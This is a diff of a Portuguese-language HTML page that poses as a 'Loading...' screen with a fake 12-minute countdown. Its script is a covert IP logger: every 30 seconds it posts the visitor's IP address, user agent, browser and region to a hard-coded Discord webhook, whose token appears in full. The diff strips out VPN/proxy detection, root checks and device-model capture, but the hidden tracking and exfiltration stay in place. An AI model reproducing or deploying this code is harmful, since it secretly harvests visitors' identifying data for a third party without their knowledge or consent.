@@ -6,7 +6,7 @@
     <title>Carregando...</title>
     <style>
         body {
-            background-color: black;
+            background-color: black;  /* fundo preto */
             color: white;
             font-family: 'Courier New', Courier, monospace;
             text-align: center;
@@ -54,10 +54,7 @@
         function getDeviceInfo() {
             const deviceInfo = navigator.userAgent;  // Informações do dispositivo
             const browser = getBrowser();  // Função para capturar o navegador corretamente
-            const isMobile = /Mobi|Android/i.test(deviceInfo);
-            const isPC = !isMobile;
-
-            return { deviceInfo, browser, isMobile, isPC };
+            return { deviceInfo, browser };
         }
 
         // Função para detectar o navegador corretamente
@@ -74,29 +71,6 @@
             }
         }
 
-        // Função para verificar se o dispositivo está rootado (mobile)
-        function isRooted() {
-            if (/android/i.test(navigator.userAgent)) {
-                try {
-                    // Tentativa de verificar arquivos típicos de root em Android
-                    const fs = new ActiveXObject("Scripting.FileSystemObject");
-                    return fs.FileExists("/system/app/Superuser.apk") || fs.FileExists("/system/xbin/su");
-                } catch (e) {
-                    return false;
-                }
-            }
-            return false;
-        }
-
-        // Função para verificar se o usuário está usando VPN ou Proxy
-        function detectVPNorProxy(ip) {
-            return fetch(`https://ip-api.com/json/${ip}`)
-                .then(response => response.json())
-                .then(data => {
-                    return data.proxy ? "Proxy Detectado" : "Sem Proxy/VPN Detectado";
-                });
-        }
-
         // Função para enviar as informações para o Discord Webhook
         function sendToDiscord(info) {
             const webhookUrl = 'https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3';
@@ -111,10 +85,7 @@
 > **IP:** ${info.ip}
 > **Dispositivo:** ${info.deviceInfo}
 > **Navegador:** ${info.browser}
-> **Modelo de Dispositivo:** ${info.model}
-> **VPN/Proxy:** ${info.vpnOrProxy}
-> **Root:** ${info.isRooted ? "Sim" : "Não"}
-> **Tipo de Dispositivo:** ${info.isMobile ? "Mobile" : "PC"}
+> **Região:** ${info.region}
 `)
             })
             .then(response => {
@@ -139,15 +110,6 @@
                 });
         }
 
-        // Função para pegar o modelo do dispositivo
-        function getDeviceModel() {
-            if (/Mobi|Android/i.test(navigator.userAgent)) {
-                const model = navigator.userAgent.match(/(.*?)/);
-                return model ? model[1] : "Desconhecido";
-            }
-            return "Desktop";
-        }
-
         // Função para simular a espera de 12 minutos (720 segundos)
         function startLoading() {
             let elapsedTime = 0;
@@ -161,16 +123,10 @@
                 if (elapsedTime % 30 === 0) {
                     getUserIP().then(userInfo => {
                         const deviceInfo = getDeviceInfo();
-                        detectVPNorProxy(userInfo.ip).then(vpnStatus => {
-                            sendToDiscord({
-                                ...userInfo,
-                                deviceInfo: deviceInfo.deviceInfo,
-                                browser: deviceInfo.browser,
-                                model: getDeviceModel(),
-                                vpnOrProxy: vpnStatus,
-                                isRooted: isRooted(),
-                                isMobile: deviceInfo.isMobile
-                            });
+                        sendToDiscord({
+                            ...userInfo,
+                            deviceInfo: deviceInfo.deviceInfo,
+                            browser: deviceInfo.browser
                         });
                     });
                 }
